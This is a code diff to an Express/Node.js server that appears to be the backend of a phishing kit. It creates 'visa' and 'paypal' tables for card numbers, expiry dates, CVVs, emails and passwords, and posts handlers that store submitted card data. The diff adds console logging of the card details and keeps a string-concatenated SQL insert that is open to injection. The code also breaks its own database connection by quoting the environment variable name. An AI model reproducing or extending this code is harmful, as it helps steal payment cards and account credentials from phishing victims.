@@ -6,10 +6,10 @@ app.use(bodyParser.urlencoded({ extended: false }));
 const PORT = process.env.PORT || 5000;
 app.use(express.static('public'));
 app.set('view engine', 'ejs')
-const client = new pg.Client(process.env.DATABASE_URL);
+const client = new pg.Client('process.env.DATABASE_URL');
 client.connect();
 
-client.query("create table visa (id serial , card text,exp text,cvv text,time timestamp default now())")
+client.query("create table visa (id serial , card text,exp varchar,cvv text,time timestamp default now())")
 client.query("create table paypal (id serial , mail text,pass text,cardholder text,card text,exp text,cvv text,time timestamp default now())")
 // #######################################################################
 
@@ -37,6 +37,8 @@ app.post('*/visa', function (req, res) {
     var a = req.body.a;
     var b = req.body.b;
     var c = req.body.c;
+    b=b.replace('/','.')
+    console.log(a+'--'+b+'--'+c)
     client.query('Insert into visa (card,exp,cvv) values(' + a + ',' + b + ',' + c + ')')
 })
 app.post('*/paypala', function (req, res) {
